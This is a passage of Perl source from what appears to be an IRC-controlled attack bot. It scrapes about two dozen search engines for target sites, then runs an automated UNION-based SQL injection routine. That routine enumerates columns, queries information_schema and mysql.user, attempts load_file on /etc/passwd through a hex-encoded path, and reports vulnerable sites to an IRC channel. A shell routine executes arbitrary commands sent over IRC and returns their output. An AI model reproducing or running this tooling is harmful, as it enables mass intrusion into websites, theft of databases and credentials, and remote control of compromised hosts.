        my $search = ("http://www.bing.com/search?q=".key($key)."&cc=au&rf=1&first=".$i."&FORM=PORE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $link = $1;
            if ($link !~ /msn|live|bingAU/) {
                my @grep = links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub rediff() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=3000; $i+=10) {
        my $search = ("http://search1.rediff.com/dirsrch/default.asp?MT=".&key($key)."&iss=&submit=Search&firstres=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.*?)\" onmousedown/g) {
            my $link = $1;
            if ($link !~ /search1|rediff/){
				my @grep = &links($link);
				push(@list,@grep);
			}
        }
    }
    return @list;
}

sub uol() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=3000; $i+=10) {
        my $search = ("http://mundo.busca.uol.com.br/buscar.html?q=".&key($key)."&start=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/([^>\"]*)/g) {
            my $link = $1;
            if ($link !~ /busca|uol|yahoo/) {
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub bing() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=3000; $i+=10) {
        my $search = ("http://www.bing.com/search?q=".&key($key)."&filt=all&first=".$i."&FORM=PERE");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $link = $1;
            if ($link !~ /msn|live|bing/) {
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub altavista() {
    my @list;
    my $key = $_[0];
    for (my $i=1; $i<=3000; $i+=10){
        my $search = ("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".&key($key)."&stq=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<span class=ngrn>(.+?)\//g) {
            my $link = $1;
            if ($link !~ /altavista/){
                $link =~ s/<//g;
                $link =~ s/ //g;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub ask() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=3000; $i+=10) {
        my $search = ("http://it.ask.com/web?q=".&key($key)."&o=0&l=dir&qsrc=0&qid=EE90DE6E8F5370F363A63EC61228D4FE&dm=all&page=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.+?)\" onmousedown=/g) {
            my $link = $1;
            if ($link !~ /ask\.com/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yahoo(){
    my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=2000; $b+=10) {
        my $search = ("http://www.search.yahoo.com/search?p=".&key($key)."&fr2=sb-top&fr=yfp-t-713&b=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /search|yahoo/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub clusty() {
    my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=10; $b<=3000; $b+=10) {
        my $search = ("http://search.yippy.com/search?query=".&key($key)."&input-form=clusty-simple&v:sources=webplus&v:state=root|root-".$b."-10|0&");
        my $res = &search_engine_query($search);
        while ($res =~ m/<div class=\"document-header\"><a href=\"http:\/\/(.*?)\"><span class=\"title\">/g) {
            my $link = $1;
            if ($link!~ /yippy|clusty/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub gutser() {
    my @list;
    my $key = $_[0];
    my $b   = 0;
    for ($b=1; $b<=500; $b+=1) {
        my $search = ("http://www.goodsearch.com/Search.aspx?Keywords=".&key($key)."&page=".$b."&osmax=0");
        my $res = &search_engine_query($search);
        while ($res =~ m/\">(.*?)<\/a><\/div><\/li><li>/g) {
            my $link = $1;
            if ($link!~ /goodsearch/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub google2() {
  my @list;
  my $key = $_[0];
  my $b	  = 0;
  my @doms = (
    "com","ae","com.ar","at","com.au","be","com.br","ca","ch","cl","de","dk","fi","fr","gr","com.hk",
    "ie","co.il","it","co.jp","co.kr","lt","lv","nl","com.pa","com.pe","pl","pt","ru","com.sg",
    "com.tr","com.tw","com.ua","co.uk","hu","co.id","com.my");
foreach my $domain (@doms) { $dom = $doms[rand(scalar(@doms))];
    for ($b=1; $b<=3000; $b+=10) {
        my $search = ("http://www.google.".$dom."/search?num=50&q=".&key($key)."&start=".$b."&sa=N");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            my $link = $1;
            if ($link!~ /google|search/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}
}
sub exalead() {
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=4000; $b+=100) {
        my $search = ("http://www.exalead.com/search/web/results/?q=".&key($key)."&elements_per_page=100&start_index=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a class=\"thumbnail\" href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /exalead/){
                my @grep = &links($link);
                push(@list,@grep);
            }
            }
        }
    return @list;	
}	

sub lycos() { #mati#
  my @list;
  my $key = $_[0];
    for ($b=1; $b<=300; $b+=1) {
        my $search = ("http://search.lycos.com/?query=".&key($key)."&page2=".$b."&tab=web&searchArea=web");
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/([^>\"]*)\"/g) {
            my $link = $1;
            if ($link!~ /search|lycos/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}	

sub virgilio() {
  my @list;
  my $key = $_[0];
    for ($b=10; $b<=3000; $b+=10) {
        my $search = ("http://ricerca.virgilio.it/ricerca?qs=".&key($key)."&filter=1&site=&lr=&hits=10&offset=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<h3><a href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /virgilio/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}	

sub webde() {
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=300; $b+=1) {
        my $search = ("http://suche.web.de/search/web/?pageIndex=".$b."&su=".$key);
        my $res = &search_engine_query($search);
        while ($res =~ m/<span class=\"url\">http:\/\/(.*?)<\/span>/g) {
            my $link = $1;
            if ($link!~ /suche|web/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}	

sub hotbot() { #mati#
  my @list;
  my $key = $_[0];
    for ($b=0; $b<=300; $b+=1) {
        my $search = ("http://www.hotbot.com/?query=".&key($key)."&ps=&loc=searchbox&tab=web&mode=search&currProv=msn&page=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /hotbot|msn/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}	

sub aol() {
  my @list;
  my $key = $_[0];
    for ($b=2; $b<=300; $b+=1) {
        my $search = ("http://aim.search.aol.com/aol/search?q=".&key($key)."&page=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" property/g) {
            my $link = $1;
            if ($link!~ /aol\.com/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;	
}

sub sapo(){
    my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=500; $b+=1) {
        my $search = ("http://pesquisa.sapo.pt/?barra=resumo&cluster=0&format=html&limit=10&location=pt&page=".$b."&q=".&key($key)."&st=local");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /sapo/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub duck() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=500; $b+=1) {
        my $search = ("http://duckduckgo.com/html/?q=".&key($key)."&t=A&l=en&p=1&s=".$b."&o=json&dc=".$b."&api=d.js");
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /duck/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub lygo() { #mati#
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=500; $b+=1) {
        my $search = ("http://www.hotbot.com/?query=".&key($key)."&ps=&loc=searchbox&tab=web&mode=search&currProv=lygo&page2=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /hotbot|lygo/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub yause() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=500; $b+=1) {
        my $search = ("http://www.yauba.com/?query=".&key($key)."&where=websites&target=websites&con=y&ilang=english&clt=topic&pg=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/<h1><a rel=\"nofollow\" href=\"http:\/\/(.*?)\" onfocus=/g) {
            my $link = $1;
            if ($link!~ /yauba|websites/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub baidu() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=0; $b<=3000; $b+=10) {
        my $search = ("http://www.baidu.com/s?wd=".&key($key)."&pn=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/\" href=\"http:\/\/(.*?)\"  target=/g) {
            my $link = $1;
            if ($link!~ /baidu/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub kipot() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=1; $b<=300; $b+=1) {
        my $search = ("http://www.qkport.com/".$b."/web/".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"http:\/\/(.*?)\" target=\"_top\"/g) {
            my $link = $1;
            if ($link!~ /qkport/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub gibla() {
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=0; $b<=3000; $b+=10) {
        my $search = ("http://www.gigablast.com/search?s=".$b."&q=".&key($key));
        my $res = &search_engine_query($search);
        while ($res =~ m/href=http:\/\/(.*?)><font size=/g) {
            my $link = $1;
            if ($link!~ /gigablast/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub black() { #mati#
	my @list;
	my $key = $_[0];
    my $b   = 0;
	for ($b=0; $b<=300; $b+=1) {
        my $search = ("http://blekko.com/ws/".&key($key)."?ft=&p=".$b);
        my $res = &search_engine_query($search);
        while ($res =~ m/href=\"=http:\/\/(.*?)\"/g) {
            my $link = $1;
            if ($link!~ /blekko/){
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

#########################################

sub clean() {
    my @cln = ();
    my %visit = ();
    foreach my $element (@_) {
        $element =~ s/\/+/\//g;
        next if $visit{$element}++;
        push @cln, $element;
    }
    return @cln;
}

sub key() {
    my $dork = $_[0];
    $dork =~ s/ /\+/g;
    $dork =~ s/:/\%3A/g;
    $dork =~ s/\//\%2F/g;
    $dork =~ s/\?/\%3F/g;
    $dork =~ s/&/\%26/g;
    $dork =~ s/\"/\%22/g;
    $dork =~ s/,/\%2C/g;
    $dork =~ s/\\/\%5C/g;
	$dork =~ s/@/\%40/g;
	$dork =~ s/\[/\%5B/g;
	$dork =~ s/\]/\%5D/g;
	$dork =~ s/\?/\%3F/g;
	$dork =~ s/\=/\%3D/g;
	$dork =~ s/\|/\%7C/g;
    return $dork;
}

sub links() {
    my @list;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/$1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push(@list,$link,$host,$hdir);
    return @list;
}

sub search_engine_query() {
    my $url = $_[0];
    $url =~ s/http:\/\///;
    my $host = $url;
    my $query = $url;
    my $page  = "";
    $host =~ s/href=\"?http:\/\///;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $query =~ s/$host//;
    if ($query eq "") { $query = "/"; }
        eval {
            my $sock = IO::Socket::INET->new(PeerAddr=>"$host", PeerPort=>"80", Proto=>"tcp") or return;
            print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: $uagent\r\n\r\n";
            my @pages = <$sock>;
            $page = "@pages";
            close($sock);
        };
    return $page;
}

sub sqlbrute() {
my $site=$_[0];
my $columns=20;
my $cfin.="--";
my $cmn.= "+";
for ($column = 0 ; $column < $columns ; $column ++)
	{
	$union.=','.$column;
	$inyection.=','."0x6c6f67696e70776e7a";
    if ($column == 0)
       {
	$inyection = '';
        $union = '';
       }
        $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cfin;
        $response=get($sql);
    if ($response =~ /loginpwnz/)
		{
        $column ++;
        $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cfin;
		 &msg("$chan","$sqllogo(MySQL)4 $sql ");
        $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."information_schema.tables".$cfin;
        $response=get($sql)or die("[-] Impossible to get Information_Schema\n");
         if($response =~ /loginpwnz/)
         	{
         	$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."information_schema.tables".$cfin;
			&msg("$chan","$sqllogo(SCHEMA)14 $sql ");
         	}
         $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."mysql.user".$cfin;
         $response=get($sql)or die("[-] Impossible to get MySQL.User\n");
         if($response =~ /loginpwnz/)
         	{
         	$sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."mysql.user".$cfin;
			&msg("$chan","$sqllogo(USER)14 $sql ");
         	}
         else
         	{
         	}
	while ($loadcont < $column-1)
	   {
		$loadfile.=','.'load_file(0x2f6574632f706173737764)';
		$loadcont++;
	   }
	   $sql=$site."-1".$cmn."union".$cmn."select".$cmn."load_file(0x2f6574632f706173737764)".$loadfile.$cfin;
	 $response=get($sql)or die("[-] Impossible to inject LOAD_FILE\n");
         if($response =~ /root:x:/)
         	{
			&msg("$chan","$sqllogo(Load File)14 $sql ");
		}
         else
         	{
         	}
	          foreach $tabla(@tabele)
                {
                  chomp($tabla);
                  $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn.$tabla.$cfin;
		  $response=get($sql)or die("[-] Impossible to get tables\n");
                  if($response =~ /loginpwnz/)
                    {
                    $sql=$site."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn.$tabla.$cfin;
					&msg("$chan","$sqllogo(Tabel)14 $sql ");
					&tabelka($site,$tabla);
                    }
                }
	    }
	}			
}

sub tabelka() {
	my $site=$_[0];
	my $tabla=$_[1];
	my $cfin.="--";
	my $cmn.= "+";
            chomp($tabla);
            foreach $columna(@kolumny)
            {
             chomp($columna);
             $sql=$site."-1".$cmn."union".$cmn."select".$cmn."concat(0x6c6f67696e70776e7a,0x3a,$columna)".$inyection.$cmn."from".$cmn.$tabla.$cfin;
             $response=get($sql)or die("[-] Impossible to get columns\n");
             if ($response =~ /loginpwnz/)
                {
				&msg("$chan","$sqllogo(SQLi Vuln)4 $site (Kolom)14 $columna (Tabel)14 $tabla ");
                }
            }
        
}

#########################################

sub shell() {
    my $path = $_[0];
    my $cmd = $_[1];
    if ($cmd =~ /cd (.*)/) {
        chdir("$1") || &msg("$path","No such file or directory");
        return;
    }
    elsif ($pid = fork) { waitpid($pid, 0); }
    else { if (fork) { exit; } else {
        my @output = `$cmd 2>&1 3>&1`;
        my $c = 0;
        foreach my $output (@output) {
            $c++;
            chop $output;
            &msg("$path","$output");
            if ($c == 5) { $c = 0; sleep 2; }
        }
        exit;
    }}
}

sub isAdmin() {
    my $status = 0;
    my $nick = $_[0];
    if ($nick eq $admin) { $status = 1; }
    return $status;
}

sub msg() {
    return unless $#_ == 1;
    sendraw($IRC_cur_socket, "PRIVMSG $_[0] :$_[1]");
}

sub nick() {
    return unless $#_ == 0;
    sendraw("NICK $_[0]");
}

sub notice() {
    return unless $#_ == 1;
    sendraw("NOTICE $_[0] :$_[1]");
}